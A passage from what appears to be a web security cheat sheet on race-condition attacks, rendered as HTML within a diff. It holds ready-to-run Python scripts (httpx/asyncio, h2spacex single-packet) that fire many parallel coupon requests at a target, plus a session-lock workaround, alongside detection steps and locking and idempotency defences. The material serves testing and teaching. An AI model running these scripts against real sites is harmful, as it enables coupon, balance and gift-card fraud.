+</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="n">engine</span><span class="o">.</span><span class="n">openGate</span><span class="p">(</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+<hr />
+<h2 id="python-alternative-no-burp-suite">Python Alternative (No Burp Suite)<a class="headerlink" href="#python-alternative-no-burp-suite" title="Permanent link">&para;</a></h2>
+<h3 id="using-httpx-asyncio">Using httpx + asyncio<a class="headerlink" href="#using-httpx-asyncio" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">asyncio</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">httpx</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">race_request</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>    <span class="k">return</span> <span class="k">await</span> <span class="n">client</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>    <span class="k">async</span> <span class="k">with</span> <span class="n">httpx</span><span class="o">.</span><span class="n">AsyncClient</span><span class="p">(</span><span class="n">http2</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="k">as</span> <span class="n">client</span><span class="p">:</span>
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>        <span class="n">tasks</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>        <span class="c1"># Create 20 concurrent requests</span>
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>            <span class="n">tasks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span>
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>                <span class="n">asyncio</span><span class="o">.</span><span class="n">ensure_future</span><span class="p">(</span>
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>                    <span class="n">race_request</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> 
+</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>                        <span class="s1">&#39;https://target.com/apply-coupon&#39;</span><span class="p">,</span>
+</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>                        <span class="p">{</span><span class="s1">&#39;code&#39;</span><span class="p">:</span> <span class="s1">&#39;DISCOUNT50&#39;</span><span class="p">}</span>
+</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a>                    <span class="p">)</span>
+</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>                <span class="p">)</span>
+</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a>            <span class="p">)</span>
+</span><span id="__span-23-21"><a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a>
+</span><span id="__span-23-22"><a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a>        <span class="c1"># Fire all simultaneously</span>
+</span><span id="__span-23-23"><a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a>        <span class="n">results</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">gather</span><span class="p">(</span><span class="o">*</span><span class="n">tasks</span><span class="p">,</span> <span class="n">return_exceptions</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span><span id="__span-23-24"><a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a>
+</span><span id="__span-23-25"><a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a>        <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
+</span><span id="__span-23-26"><a id="__codelineno-23-26" name="__codelineno-23-26" href="#__codelineno-23-26"></a>            <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="s1">&#39;status_code&#39;</span><span class="p">):</span>
+</span><span id="__span-23-27"><a id="__codelineno-23-27" name="__codelineno-23-27" href="#__codelineno-23-27"></a>                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Status: </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-23-28"><a id="__codelineno-23-28" name="__codelineno-23-28" href="#__codelineno-23-28"></a>
+</span><span id="__span-23-29"><a id="__codelineno-23-29" name="__codelineno-23-29" href="#__codelineno-23-29"></a><span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
+</span></code></pre></div>
+<h3 id="using-h2spacex-true-single-packet">Using h2spacex (True Single-Packet)<a class="headerlink" href="#using-h2spacex-true-single-packet" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">h2spacex</span><span class="w"> </span><span class="kn">import</span> <span class="n">H2OnTlsConnection</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;target.com&quot;</span>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="n">port</span> <span class="o">=</span> <span class="mi">443</span>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="n">h2_conn</span> <span class="o">=</span> <span class="n">H2OnTlsConnection</span><span class="p">(</span><span class="n">hostname</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">port_number</span><span class="o">=</span><span class="n">port</span><span class="p">)</span>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="n">h2_conn</span><span class="o">.</span><span class="n">setup_connection</span><span class="p">()</span>
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="c1"># Generate stream IDs</span>
+</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="n">stream_ids</span> <span class="o">=</span> <span class="n">h2_conn</span><span class="o">.</span><span class="n">generate_stream_ids</span><span class="p">(</span><span class="n">number_of_streams</span><span class="o">=</span><span class="mi">50</span><span class="p">)</span>
+</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>
+</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a><span class="n">all_headers</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a><span class="n">all_data</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>
+</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">stream_id</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">stream_ids</span><span class="p">):</span>
+</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a>    <span class="n">headers</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">h2_conn</span><span class="o">.</span><span class="n">create_single_packet_http2_post_request_frames</span><span class="p">(</span>
+</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a>        <span class="n">method</span><span class="o">=</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a>        <span class="n">headers_string</span><span class="o">=</span><span class="s1">&#39;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s1">Cookie: session=xxx&#39;</span><span class="p">,</span>
+</span><span id="__span-24-19"><a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a>        <span class="n">scheme</span><span class="o">=</span><span class="s1">&#39;https&#39;</span><span class="p">,</span>
+</span><span id="__span-24-20"><a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a>        <span class="n">stream_id</span><span class="o">=</span><span class="n">stream_id</span><span class="p">,</span>
+</span><span id="__span-24-21"><a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a>        <span class="n">authority</span><span class="o">=</span><span class="n">host</span><span class="p">,</span>
+</span><span id="__span-24-22"><a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a>        <span class="n">body</span><span class="o">=</span><span class="s1">&#39;code=DISCOUNT50&#39;</span><span class="p">,</span>
+</span><span id="__span-24-23"><a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a>        <span class="n">path</span><span class="o">=</span><span class="s1">&#39;/apply-coupon&#39;</span>
+</span><span id="__span-24-24"><a id="__codelineno-24-24" name="__codelineno-24-24" href="#__codelineno-24-24"></a>    <span class="p">)</span>
+</span><span id="__span-24-25"><a id="__codelineno-24-25" name="__codelineno-24-25" href="#__codelineno-24-25"></a>    <span class="n">all_headers</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">headers</span><span class="p">)</span>
+</span><span id="__span-24-26"><a id="__codelineno-24-26" name="__codelineno-24-26" href="#__codelineno-24-26"></a>    <span class="n">all_data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span><span id="__span-24-27"><a id="__codelineno-24-27" name="__codelineno-24-27" href="#__codelineno-24-27"></a>
+</span><span id="__span-24-28"><a id="__codelineno-24-28" name="__codelineno-24-28" href="#__codelineno-24-28"></a><span class="c1"># Send headers (everything except last byte)</span>
+</span><span id="__span-24-29"><a id="__codelineno-24-29" name="__codelineno-24-29" href="#__codelineno-24-29"></a><span class="n">h2_conn</span><span class="o">.</span><span class="n">send_bytes</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">h</span><span class="p">)</span> <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">all_headers</span><span class="p">))</span>
+</span><span id="__span-24-30"><a id="__codelineno-24-30" name="__codelineno-24-30" href="#__codelineno-24-30"></a>
+</span><span id="__span-24-31"><a id="__codelineno-24-31" name="__codelineno-24-31" href="#__codelineno-24-31"></a><span class="kn">import</span><span class="w"> </span><span class="nn">time</span><span class="p">;</span> <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>  <span class="c1"># Wait for network</span>
+</span><span id="__span-24-32"><a id="__codelineno-24-32" name="__codelineno-24-32" href="#__codelineno-24-32"></a>
+</span><span id="__span-24-33"><a id="__codelineno-24-33" name="__codelineno-24-33" href="#__codelineno-24-33"></a><span class="c1"># Send ping to warm connection</span>
+</span><span id="__span-24-34"><a id="__codelineno-24-34" name="__codelineno-24-34" href="#__codelineno-24-34"></a><span class="n">h2_conn</span><span class="o">.</span><span class="n">send_ping_frame</span><span class="p">()</span>
+</span><span id="__span-24-35"><a id="__codelineno-24-35" name="__codelineno-24-35" href="#__codelineno-24-35"></a>
+</span><span id="__span-24-36"><a id="__codelineno-24-36" name="__codelineno-24-36" href="#__codelineno-24-36"></a><span class="c1"># Release all final bytes simultaneously</span>
+</span><span id="__span-24-37"><a id="__codelineno-24-37" name="__codelineno-24-37" href="#__codelineno-24-37"></a><span class="n">h2_conn</span><span class="o">.</span><span class="n">send_bytes</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">all_data</span><span class="p">))</span>
+</span><span id="__span-24-38"><a id="__codelineno-24-38" name="__codelineno-24-38" href="#__codelineno-24-38"></a>
+</span><span id="__span-24-39"><a id="__codelineno-24-39" name="__codelineno-24-39" href="#__codelineno-24-39"></a><span class="c1"># Read responses</span>
+</span><span id="__span-24-40"><a id="__codelineno-24-40" name="__codelineno-24-40" href="#__codelineno-24-40"></a><span class="n">resp</span> <span class="o">=</span> <span class="n">h2_conn</span><span class="o">.</span><span class="n">read_response_from_socket</span><span class="p">(</span><span class="n">_timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span></code></pre></div>
+<hr />
+<h2 id="detection-methodology">Detection Methodology<a class="headerlink" href="#detection-methodology" title="Permanent link">&para;</a></h2>
+<h3 id="1-identify-targets">1. Identify Targets<a class="headerlink" href="#1-identify-targets" title="Permanent link">&para;</a></h3>
+<p><strong>Look for:</strong>
+- Single-use tokens (coupons, invites, verification)
+- Balance/counter operations
+- State-changing operations on shared resources
+- Session-stored data modified by multiple endpoints</p>
+<p><strong>Key questions:</strong>
+- Is state stored server-side (not just JWT)?
+- Does the operation EDIT existing data (not just append)?
+- What's the operation keyed on (session, user ID, token)?</p>
+<h3 id="2-benchmark-normal-behavior">2. Benchmark Normal Behavior<a class="headerlink" href="#2-benchmark-normal-behavior" title="Permanent link">&para;</a></h3>
+<p>Send requests sequentially first to understand expected responses.</p>
+<h3 id="3-send-parallel-requests">3. Send Parallel Requests<a class="headerlink" href="#3-send-parallel-requests" title="Permanent link">&para;</a></h3>
+<p>Use single-packet attack with 20-30 requests.</p>
+<h3 id="4-look-for-clues">4. Look for Clues<a class="headerlink" href="#4-look-for-clues" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Different response codes</li>
+<li>Different response times</li>
+<li>Different response bodies</li>
+<li>Second-order effects (extra emails, changed data)</li>
+</ul>
+<p><strong>Negative timestamps in Turbo Intruder</strong> = response before request completed = race confirmed!</p>
+<hr />
+<h2 id="session-based-locking-bypass">Session-Based Locking Bypass<a class="headerlink" href="#session-based-locking-bypass" title="Permanent link">&para;</a></h2>
+<p><strong>PHP locks requests per session by default</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="x">// PHP serializes requests with same session</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="x">session_start();  // Blocks until previous request completes</span>
+</span></code></pre></div>
+<h3 id="bypass">Bypass<a class="headerlink" href="#bypass" title="Permanent link">&para;</a></h3>
+<p>Use <strong>different session tokens</strong> for each parallel request:</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">sessions</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;session1&#39;</span><span class="p">,</span> <span class="s1">&#39;session2&#39;</span><span class="p">,</span> <span class="s1">&#39;session3&#39;</span><span class="p">,</span> <span class="o">...</span><span class="p">]</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">sess</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">sessions</span><span class="p">):</span>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>    <span class="n">req</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">req</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;session=xxx&#39;</span><span class="p">,</span> <span class="sa">f</span><span class="s1">&#39;session=</span><span class="si">{</span><span class="n">sess</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+<hr />
+<h2 id="real-bug-bounty-reports">Real Bug Bounty Reports<a class="headerlink" href="#real-bug-bounty-reports" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Vulnerability</th>
+<th>Impact</th>
+<th>Bounty</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HackerOne</td>
+<td>Flag submission race</td>
+<td>Points inflation</td>
+<td>N/A</td>
+</tr>
+<tr>
+<td>Reverb.com</td>
+<td>Gift card redeem race</td>
+<td>Financial</td>
+<td>$500</td>
+</tr>
+<tr>
+<td>GitLab</td>
+<td>Email verification race</td>
+<td>Account takeover</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>Starbucks</td>
+<td>Reward multiplication</td>
+<td>Financial</td>
+<td>$3,000</td>
+</tr>
+<tr>
+<td>Every.org</td>
+<td>Follow race condition</td>
+<td>Social manipulation</td>
+<td>$250</td>
+</tr>
+<tr>
+<td>Pornhub Premium</td>
+<td>Subscription race</td>
+<td>Access control</td>
+<td>$520</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="prevention">Prevention<a class="headerlink" href="#prevention" title="Permanent link">&para;</a></h2>
+<h3 id="1-database-level-locking">1. Database-Level Locking<a class="headerlink" href="#1-database-level-locking" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1">-- Pessimistic locking</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">accounts</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="k">FOR</span><span class="w"> </span><span class="k">UPDATE</span><span class="p">;</span>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="c1">-- Optimistic locking with version</span>
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="k">UPDATE</span><span class="w"> </span><span class="n">accounts</span><span class="w"> </span>
+</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="k">SET</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span><span class="w"> </span><span class="k">version</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">version</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span>
+</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">version</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">?</span><span class="p">;</span>
+</span></code></pre></div>
+<h3 id="2-idempotency-keys">2. Idempotency Keys<a class="headerlink" href="#2-idempotency-keys" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">process_payment</span><span class="p">(</span><span class="n">idempotency_key</span><span class="p">,</span> <span class="n">amount</span><span class="p">):</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>    <span class="k">if</span> <span class="n">redis</span><span class="o">.</span><span class="n">setnx</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;payment:</span><span class="si">{</span><span class="n">idempotency_key</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;processing&quot;</span><span class="p">):</span>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>        <span class="c1"># First request - process</span>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>        <span class="n">result</span> <span class="o">=</span> <span class="n">charge_card</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>        <span class="n">redis</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;payment:</span><span class="si">{</span><span class="n">idempotency_key</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">result</span><span class="p">)</span>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>    <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>        <span class="c1"># Duplicate - return cached result</span>
+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>        <span class="k">return</span> <span class="n">redis</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;payment:</span><span class="si">{</span><span class="n">idempotency_key</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="3-atomic-operations">3. Atomic Operations<a class="headerlink" href="#3-atomic-operations" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1"># Bad</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="n">balance</span> <span class="o">=</span> <span class="n">get_balance</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="k">if</span> <span class="n">balance</span> <span class="o">&gt;=</span> <span class="n">amount</span><span class="p">:</span>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>    <span class="n">set_balance</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">balance</span> <span class="o">-</span> <span class="n">amount</span><span class="p">)</span>
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="c1"># Good - atomic decrement</span>
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="s2">    UPDATE accounts </span>
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="s2">    SET balance = balance - </span><span class="si">%s</span><span class="s2"> </span>
+</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a><span class="s2">    WHERE id = </span><span class="si">%s</span><span class="s2"> AND balance &gt;= </span><span class="si">%s</span>
+</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a><span class="s2">    RETURNING balance</span>
+</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a><span class="s2">&quot;&quot;&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">amount</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">amount</span><span class="p">))</span>
+</span></code></pre></div>
+<h3 id="4-request-serialization">4. Request Serialization<a class="headerlink" href="#4-request-serialization" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">threading</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="n">user_locks</span> <span class="o">=</span> <span class="p">{}</span>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="k">def</span><span class="w"> </span><span class="nf">get_user_lock</span><span class="p">(</span><span class="n">user_id</span><span class="p">):</span>
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>    <span class="k">if</span> <span class="n">user_id</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">user_locks</span><span class="p">:</span>
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>        <span class="n">user_locks</span><span class="p">[</span><span class="n">user_id</span><span class="p">]</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span>
+</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>    <span class="k">return</span> <span class="n">user_locks</span><span class="p">[</span><span class="n">user_id</span><span class="p">]</span>
+</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>
+</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a><span class="k">def</span><span class="w"> </span><span class="nf">withdraw</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">amount</span><span class="p">):</span>
+</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>    <span class="k">with</span> <span class="n">get_user_lock</span><span class="p">(</span><span class="n">user_id</span><span class="p">):</span>
+</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>        <span class="c1"># Serialized per-user</span>
